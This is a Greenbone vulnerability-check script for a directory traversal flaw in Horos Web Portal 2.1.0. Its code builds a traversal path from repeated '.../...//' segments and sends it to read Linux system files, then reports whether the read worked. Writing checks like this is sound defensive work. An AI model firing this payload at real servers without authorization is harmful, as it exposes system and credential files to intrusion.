# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:horos:horos";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107115");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2016-12-28 13:26:09 +0700 (Wed, 28 Dec 2016)");
  script_tag(name:"qod_type", value:"remote_app");
  script_name("Horos Web Portal Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"Horos Web Portal is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read a specific file or not.");

  script_tag(name:"insight", value:"Horos suffers from a file disclosure vulnerability when input passed through the
  URL path is not properly verified before being used to read files.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers
  to read arbitrary files.");

  script_tag(name:"affected", value:"Horos Web Portal version 2.1.0");

  script_tag(name:"solution", value:"Apply the latest updated supplied by the vendor.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5387.php");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_horos_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("horos/installed");
  script_require_ports("Services/www", 3333);
  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

files = traversal_files("linux");

if( dir == "/" ) dir = "";

foreach file (keys(files))
{
  url = dir + "/" + crap( data:".../...//", length:10*9) + files[file];

  if(http_vuln_check(port:http_port, url:url, check_header:TRUE, pattern:file)) {
    report = http_report_vuln_url(port:http_port, url:url);
    security_message(port:http_port, data:report);
    exit(0);
  }
}

exit(99);
